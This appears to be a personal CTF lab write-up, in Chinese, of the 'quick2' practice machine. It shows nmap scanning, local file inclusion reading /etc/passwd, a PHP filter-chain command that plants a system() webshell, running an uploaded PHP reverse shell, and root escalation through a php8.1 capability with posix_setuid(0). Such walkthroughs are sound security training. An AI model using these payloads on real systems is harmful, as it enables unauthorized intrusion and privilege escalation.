---
title: quick2
tags:
  - sec
date: 2024-02-09T09:33:26
lastmod: 2025-09-29T20:51:57
toc: "true"
draft: "false"
---

启动靶机前
![HMM_quick2_image_1|700](https://img.l1uyun.one/HMM_quick2_image_1.png)
启动后
![HMM_quick2_image_2|650](https://img.l1uyun.one/HMM_quick2_image_2.png)
192.168.10.4
![HMM_quick2_image_3|600](https://img.l1uyun.one/HMM_quick2_image_3.png)
2024-02-14-20:18:39
后面都是直接用 arp-scan 来扫描某一个网卡的下的局域网ip 了
## 端口扫描
![HMM_quick2_image_4|700](https://img.l1uyun.one/HMM_quick2_image_4.png)

```bash
sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
```


![HMM_quick2_image_5|750](https://img.l1uyun.one/HMM_quick2_image_5.png)

```bash
sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA  portscan/vuln
```

![HMM_quick2_image_6|700](https://img.l1uyun.one/HMM_quick2_image_6.png)
## web 服务

主页里面在端口扫描的时候发现有一个参数 page
尝试 local file include LFI
获取到了/etc/passwd
在 home 目录下有文件夹的有这两个用户

```bash
andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash
nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash
```

获得了 user. txt

![HMM_quick2_image_7|500](https://img.l1uyun.one/HMM_quick2_image_7.png)

![HMM_quick2_image_8|483](https://img.l1uyun.one/HMM_quick2_image_8.png)


进行目录扫描 ferox 发现失效了, 以后还是先尝试 gobuster, 不行的话再 feroxbuster
![HMM_quick2_image_9|750](https://img.l1uyun.one/HMM_quick2_image_9.png)
进入 file. php 页面
## 利用 php 伪协议获得一个 webshell
写了是 LFI 漏洞
![HMM_quick2_image_10|479](https://img.l1uyun.one/HMM_quick2_image_10.png)
2024-02-14-20:40:27
这个工具是看大佬的 wp 视频知道了, 反正以后遇到使用 php 伪协议的, 就可以用这个工具了

使用工具生成一个复杂的伪协议利用代码，获得一个 webshell

```bash
python php_filter_chain_generator.py --chain "<?php echo system($_GET['cmd']) ?>"
```

![HMM_quick2_image_11|700](https://img.l1uyun.one/HMM_quick2_image_11.png)

![HMM_quick2_image_12|900](https://img.l1uyun.one/HMM_quick2_image_12.png)

测试之后发现存在 nc，但是不能用
只能 php 反向 shell 了, 上传一下, 然后执行

![HMM_quick2_image_13|900](https://img.l1uyun.one/HMM_quick2_image_13.png)

![HMM_quick2_image_14|800](https://img.l1uyun.one/HMM_quick2_image_14.png)
## php 反向 shell 获得立足点
![HMM_quick2_image_15](https://img.l1uyun.one/HMM_quick2_image_15.png)

![HMM_quick2_image_16](https://img.l1uyun.one/HMM_quick2_image_16.png)

```bash
a=php%20/tmp/shell.txt
```
![HMM_quick2_image_17](https://img.l1uyun.one/HMM_quick2_image_17.png)

## 利用 capabilities 文件提权
第一步先上脚本, linpeas. sh, 然后发现了这个特殊权限的文件 php
```bash
/usr/bin/php8.1
```
![HMM_quick2_image_18](https://img.l1uyun.one/HMM_quick2_image_18.png)
```bash
/usr/bin/php8.1 -r "posix_setuid(0);system('/bin/sh');"
```
![HMM_quick2_image_19](https://img.l1uyun.one/HMM_quick2_image_19.png)

## 尝试其他思路
尝试爆破一下密码, 但是没成功
根据后面获得的 shadow 文件也没有破解出对应的密码


